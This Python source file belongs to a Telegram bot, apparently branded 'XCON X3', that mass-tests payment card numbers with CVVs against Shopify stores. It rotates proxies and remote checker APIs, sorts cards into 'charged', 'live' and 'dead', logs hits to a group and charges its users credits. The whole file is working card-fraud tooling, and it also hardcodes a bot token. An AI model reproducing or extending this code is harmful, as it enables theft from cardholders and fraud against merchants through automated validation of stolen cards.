import asyncio
import aiohttp
import json
import threading as _threading
import random
import re
import logging
import time
import string
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from collections import deque
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SAFE HTML FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def safe_html(text) -> str:
    """Make text safe for HTML parsing - prevents Telegram parse errors"""
    if text is None:
        return ""
    text = str(text)
    text = text.replace('&', '&amp;')
    text = text.replace('<', '&lt;')
    text = text.replace('>', '&gt;')
    text = text.replace('"', '&quot;')
    text = text.replace("'", '&#39;')
    return text

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters.callback_data import CallbackData
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from rate_limiter import RateLimiter

LOG_BOT_TOKEN = "8837253236:AAHPRB4L3CtGeeTWV2x4UhrA7dlfuMXUePs"
log_bot = Bot(token=LOG_BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
hit_log_limiter = RateLimiter(min_interval=3.0)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, update_user_hits, deduct_credits_atomic, ADMIN_IDS
import database
from bin import get_bin_info
from sub import get_premium_status
from ui import mass_status_frame, random_diamond, random_star, REPLY_EMOJI_ID, gate_result_caption
from video_helpers import send_random_video

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

BTN_CHARGED_EMOJI_ID = "5465465194056525619"
BTN_DEAD_EMOJI_ID = "5042112436648281096"
BTN_LIVE_EMOJI_ID = "5039793437776282663"
BTN_STOP_EMOJI_ID = "6179444193518162239"
BTN_ALL_EMOJI_ID = "4956324463525233747"

HIT_LOG_GROUP_ID = -1004420445815

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS = {}
SESSION_LOCKS = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API ENDPOINTS CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_ENDPOINTS = []

API_HEALTH = {endpoint: {"healthy": True, "last_fail": 0, "fail_count": 0, "success_count": 0} for endpoint in API_ENDPOINTS}
CURRENT_API_INDEX = 0
API_FAIL_COOLDOWN = 120
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API MANAGEMENT FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_next_healthy_api():
    global CURRENT_API_INDEX
    current_time = time.time()
    healthy_endpoints = []
    
    if not API_ENDPOINTS:
        return None
    
    for endpoint, health in API_HEALTH.items():
        if health["healthy"]:
            healthy_endpoints.append(endpoint)
        elif current_time - health["last_fail"] > API_FAIL_COOLDOWN:
            health["healthy"] = True
            health["fail_count"] = 0
            healthy_endpoints.append(endpoint)
            logging.info(f"[API] Recovered endpoint: {endpoint}")
    
    if not healthy_endpoints:
        logging.warning("[API] All endpoints unhealthy, resetting health status")
        for endpoint in API_ENDPOINTS:
            API_HEALTH[endpoint]["healthy"] = True
            API_HEALTH[endpoint]["fail_count"] = 0
        healthy_endpoints = API_ENDPOINTS.copy()
    
    start_idx = CURRENT_API_INDEX % len(healthy_endpoints)
    CURRENT_API_INDEX = (CURRENT_API_INDEX + 1) % len(healthy_endpoints)
    return healthy_endpoints[start_idx]

def mark_api_failure(endpoint: str):
    if endpoint in API_HEALTH:
        API_HEALTH[endpoint]["healthy"] = False
        API_HEALTH[endpoint]["last_fail"] = time.time()
        API_HEALTH[endpoint]["fail_count"] += 1
        logging.warning(f"[API] Marked as FAILED: {endpoint}")

def mark_api_success(endpoint: str):
    if endpoint in API_HEALTH:
        API_HEALTH[endpoint]["success_count"] += 1
        if not API_HEALTH[endpoint]["healthy"]:
            API_HEALTH[endpoint]["healthy"] = True
            API_HEALTH[endpoint]["fail_count"] = 0
            logging.info(f"[API] Recovered endpoint: {endpoint}")

def get_api_stats() -> dict:
    stats = {}
    for endpoint, health in API_HEALTH.items():
        short_name = endpoint.replace("https://", "").replace("/shopify", "")
        stats[short_name] = {
            "healthy": health["healthy"],
            "fail_count": health["fail_count"],
            "success_count": health["success_count"],
            "last_fail": health["last_fail"]
        }
    return stats

def add_api_endpoint(new_endpoint: str) -> bool:
    global API_ENDPOINTS
    new_endpoint = new_endpoint.rstrip('/')
    if not new_endpoint.endswith('/shopify'):
        new_endpoint = new_endpoint + '/shopify'
    if new_endpoint in API_ENDPOINTS:
        return False
    API_ENDPOINTS.append(new_endpoint)
    API_HEALTH[new_endpoint] = {"healthy": True, "last_fail": 0, "fail_count": 0, "success_count": 0}
    try:
        with open("api_endpoints.txt", "w", encoding="utf-8") as f:
            for endpoint in API_ENDPOINTS:
                f.write(f"{endpoint}\n")
    except Exception as e:
        logging.error(f"Error saving API endpoints: {e}")
    return True

def load_api_endpoints():
    global API_ENDPOINTS, API_HEALTH
    try:
        if os.path.exists("api_endpoints.txt"):
            with open("api_endpoints.txt", "r", encoding="utf-8") as f:
                loaded = [line.strip() for line in f if line.strip()]
                if loaded:
                    API_ENDPOINTS = loaded
                    API_HEALTH.clear()
                    for endpoint in API_ENDPOINTS:
                        API_HEALTH[endpoint] = {"healthy": True, "last_fail": 0, "fail_count": 0, "success_count": 0}
                    logging.info(f"[API] Loaded {len(API_ENDPOINTS)} endpoints from file")
    except Exception as e:
        logging.error(f"Error loading API endpoints: {e}")

load_api_endpoints()

# ── Shared HTTP session for MSH API calls ──
_MSH_HTTP_SESSION = None

def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            connector=aiohttp.TCPConnector(limit=500, ssl=False)
        )
    return _MSH_HTTP_SESSION

_MSH_SESSION_MAX_AGE = 3600

def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD', 'OTP_REQUIRED'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway'
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id = session_id
        self.raw_proxies = list(set(proxies_list))
        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]
        self.proxy_queue = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        self.cooldown_seconds = 60
        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} proxies for session {session_id}")

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None
        proxy = proxy.strip()
        parts = proxy.split()
        if len(parts) == 4:
            user, pw, host, port = parts
            return f"{host}:{port}:{user}:{pw}"
        return proxy

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False
        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2
        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)
            proxy = self.proxy_queue.popleft()
            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)
                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]
            self.proxy_queue.append(proxy)
            self.total_uses += 1
            return proxy, True
        if self.failed_proxies:
            best_proxy = min(self.failed_proxies.keys(), key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf')))
            logging.warning(f"[ProxyManager] All proxies in cooldown, forcing {mask_proxy(best_proxy)}")
            self.total_uses += 1
            return best_proxy, True
        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''
        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False
        if '429' in response_lower or 'too many requests' in response_lower:
            return False
        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False
        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False
        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False
        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False
        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True
        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()
        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {'fail_count': 0, 'first_fail': current_time, 'last_fail': current_time, 'cooldown_until': 0}
            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time
            fail_count = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]
            fail_data['cooldown_until'] = current_time + cooldown_duration
            logging.warning(f"[ProxyManager] Proxy FAILED: {mask_proxy(proxy)} (#{fail_count}) Cooldown: {cooldown_duration}s | Response: {api_response[:80]}")
        else:
            self.report_success(proxy)

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        failed_count = len(self.failed_proxies)
        return {'total_proxies': len(self.all_proxies), 'active': active_count, 'failed': failed_count, 'total_uses': self.total_uses}

def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                return f"***@{parts[1]}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 4:
                cc, mm, yy, cvv = groups
                month = mm.zfill(2)
                if len(yy) == 4:
                    yy = yy[2:]
                return cc, month, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


REACTIONS = ["airkiss", "blush", "brofist", "celebrate", "cheers", "clap", "cool", "cuddle", "dance", "handhold", "happy", "hug", "kiss", "laugh", "lick", "love", "nervous", "nom", "nuzzle", "nyah", "pat", "peek", "shy", "sip", "sleep", "smile", "smug", "sorry", "thumbsup", "tickle", "tired", "wave", "wink", "yay", "yes"]

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

async def get_anime_gif():
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(database.get_premium_status, user_id)
    if is_premium:
        plan = await asyncio.to_thread(database.get_user_plan, user_id)
        return plan or "PREMIUM"
    return "TRIAL"

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            docs = database.get_user_proxies(user_id)
            return [d["proxy"] for d in docs]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    return proxies

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        current_date = datetime.now()
        current_year = current_date.year % 100
        current_month = current_date.month
        exp_year = int(yy)
        exp_month = int(mm)
        if exp_year < current_year:
            return True
        elif exp_year == current_year and exp_month < current_month:
            return True
        return False
    except ValueError:
        return True

def get_sites():
    sites = []
    try:
        if os.path.exists("sites.txt"):
            with open("sites.txt", "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return sites

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API PROCESSING FUNCTION (Multi-API with auto-failover)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str) -> Tuple[bool, str, str, str, str, str, str, int]:
    import urllib.parse

    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    encoded_cc = urllib.parse.quote(cc_formatted)
    
    sites = get_sites()
    if not sites:
        return (False, "No sites available", site, "Shopify Payments", "0.00", "USD", "Error", 500)
    
    current_site = site if site else random.choice(sites)
    last_result = None
    http_status = None
    
    if not API_ENDPOINTS:
        return (False, "No APIs configured", current_site, "Shopify Payments", "0.00", "USD", "Error", 500)
    
    for api_attempt in range(len(API_ENDPOINTS) * 2):
        api_url_base = get_next_healthy_api()
        if not api_url_base:
            break
        url = f"{api_url_base}?site={urllib.parse.quote(current_site, safe='')}&cc={encoded_cc}"
        
        if proxy and proxy != "None":
            encoded_proxy = urllib.parse.quote(proxy)
            url += f'&proxy={encoded_proxy}'
        
        try:
            _http = _get_msh_http_session()
            async with _http.get(url, timeout=45) as response:
                http_status = response.status
                
                if response.status == 429:
                    current_site = random.choice([s for s in sites if s != current_site] or sites)
                    continue
                
                if response.status in [400, 500, 502, 503, 504]:
                    mark_api_failure(api_url_base)
                    continue
                
                if response.status == 200:
                    try:
                        data = await response.json()
                        gateway = str(data.get("Gateway", "Shopify Payments"))
                        price = str(data.get("Price", "0.00"))
                        currency = data.get("Currency", "USD")
                        proxy_raw = data.get("Proxy", "Dead")
                        api_response = str(data.get("Response", "Unknown Error"))
                        api_response = safe_html(api_response)
                        status_raw = data.get("Status", "false")
                        
                        success = status_raw is True or str(status_raw).lower() == "true"
                        proxy_status = "Live" if "live" in str(proxy_raw).lower() or status_raw is True or str(status_raw).lower() == "true" else "Dead"
                        
                        mark_api_success(api_url_base)
                        
                        msg_upper = api_response.upper()
                        if any(k in msg_upper for k in ["ORDER PAID", "ORDER_PAID", "ORDER_PLACED", "CHARGED", "3DS", "OTP", "INSUFFICIENT", "DECLINED", "INVALID", "EXPIRED", "CVC", "THANK YOU", "FRAUD", "STOLEN", "LOST", "APPROVED", "DO NOT HONOR", "CARD_DECLINED"]):
                            return (success, api_response, current_site, gateway, price, currency, proxy_status, http_status)
                        
                        last_result = (success, api_response, current_site, gateway, price, currency, proxy_status, http_status)
                        
                    except json.JSONDecodeError:
                        mark_api_failure(api_url_base)
                        continue
                else:
                    last_result = (False, f"HTTP {response.status}", current_site, "Shopify Payments", "0.00", "USD", "Error", http_status)
                    
        except asyncio.TimeoutError:
            mark_api_failure(api_url_base)
            continue
        except aiohttp.ClientConnectorError as e:
            if "proxy" in str(e).lower() or "tunnel" in str(e).lower():
                return (False, f"Proxy Error: {str(e)[:60]}", current_site, "Shopify Payments", "0.00", "USD", "Dead", None)
            mark_api_failure(api_url_base)
            continue
        except Exception:
            mark_api_failure(api_url_base)
            continue
    
    if last_result:
        return last_result
    return (False, "All APIs failed", current_site, "Shopify Payments", "0.00", "USD", "Error", 500)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []
    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "Charged"
        type_emoji = "💎"
    elif result_type == "live":
        cards_list = session.get('live_cards', [])
        type_label = "Live"
        type_emoji = "✅"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "Dead"
        type_emoji = "❌"
    else:
        cards_list = session.get('charged_cards', []) + session.get('live_cards', []) + session.get('dead_cards', []) + session.get('error_cards', [])
        type_label = "All"
        type_emoji = "📁"

    total_count = len(cards_list)
    plan_name_clean = re.sub(r'<[^>]+>', '', plan_name)
    user_display = get_user_display(user_obj, plan_name_clean)

    lines = ["━" * 32, f"           𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", "━" * 32, "", f"Result Type → {type_label} {type_emoji}", f"Total Cards → {total_count}", f"Gateway → Shopify Mass", f"Powered By → 𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", "━" * 32, ""]

    if total_count == 0:
        lines.append("No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})
            price = card_data.get('price', 'N/A')
            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            if "CHARGED" in response or "ORDER_PLACED" in response or "ORDER_PAID" in response:
                status = "Charged 💎"
            elif "APPROVED" in response or "DS_REQUIRED" in response or "INSUFFICIENT_FUND" in response or "3DS_REQUIRED" in response or "OTP_REQUIRED" in response:
                status = "Approved ✅"
            elif any(err in response for err in ["timeout", "connection error", "max retries", "json decode", "invalid api", "Unknown Error"]):
                status = "ERROR <tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji>"
            else:
                status = "DECLINED ❌"

            lines.extend([f"Status → {status}", f"Card → {cc}", f"Gateway → Shopify {price} {card_data.get('currency', 'USD')}", f"Response → {response}", f"Brand → {scheme}", f"Issuer → {bank}", f"Country → {country_display}", f"User → {user_display}", f"Dev → SpygenCVV", "━" * 32, ""])

    content = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"XCONCHK{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MESSAGE SENDING HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, proxy_status_formatted, price, currency="USD"):
    user_link = build_user_link(user_obj)
    gateway_display = html_escape(f"Shopify {price} {currency}")
    safe_response = safe_html(response_msg)
    safe_plan = plan_name

    caption = (f"{random_diamond()} 𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {random_diamond()}\n"
               f"𝗚𝗮𝘁𝗲 ➛ <b>{gateway_display}</b>\n"
               f'<tg-emoji emoji-id="{REPLY_EMOJI_ID}">❣️</tg-emoji> <b>{safe_response}</b>\n'
               f"𝗨𝘀𝗲𝗿 ➛ {user_link} {random_star()}\n")

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot", style="primary", icon_custom_emoji_id="5827986023254072662")]])

    try:
        await hit_log_limiter.wait()
        await log_bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=caption, parse_mode="HTML", reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")

async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency="USD"):
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = safe_html(bin_data.get("country", "N/A"))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} {currency}")
    safe_response = safe_html(response_msg)
    user_link = build_user_link(user_obj)
    dev_link = '<a href="tg://openmessage?user_id=6113616017">SpygenCVV</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"

    caption = gate_result_caption(
        cmd="MSH",
        status='APPROVED <tg-emoji emoji-id="5870702999180942496">✅</tg-emoji>',
        card=html_escape(cc_formatted),
        gateway=gateway_display,
        response=safe_response,
        brand=bin_scheme,
        issuer=bin_bank,
        country=bin_country,
        user_display=user_display,
        dev_link=dev_link,
        proxy=proxy_status_formatted,
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot", style="primary", icon_custom_emoji_id="5827986023254072662")]])

    try:
        sent = await send_random_video(bot, user_obj.id, caption=caption)
        if not sent:
            await bot.send_message(chat_id=user_obj.id, text=caption, parse_mode="HTML", reply_markup=reply_markup)
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM approved hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending approved message to DM: {e}")

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency="USD"):
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} {currency}")
    safe_response = safe_html(response_msg)
    user_link = build_user_link(user_obj)
    dev_link = '<a href="tg://openmessage?user_id=6113616017">SpygenCVV</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"

    caption = gate_result_caption(
        cmd="MSH",
        status=f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {random_diamond()}",
        card=html_escape(cc_formatted),
        gateway=gateway_display,
        response=safe_response,
        brand=bin_scheme,
        issuer=bin_bank,
        country=bin_country,
        user_display=user_display,
        dev_link=dev_link,
        proxy=proxy_status_formatted,
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot", style="primary", icon_custom_emoji_id="5827986023254072662")]])

    try:
        msg_id = await send_random_video(bot, user_obj.id, caption=caption)
        if msg_id:
            try:
                await bot.pin_chat_message(chat_id=user_obj.id, message_id=msg_id)
            except Exception:
                pass
        else:
            msg = await bot.send_message(chat_id=user_obj.id, text=caption, parse_mode="HTML", reply_markup=reply_markup)
            try:
                await bot.pin_chat_message(chat_id=user_obj.id, message_id=msg.message_id)
            except Exception:
                pass
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM charged hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending charged DM: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

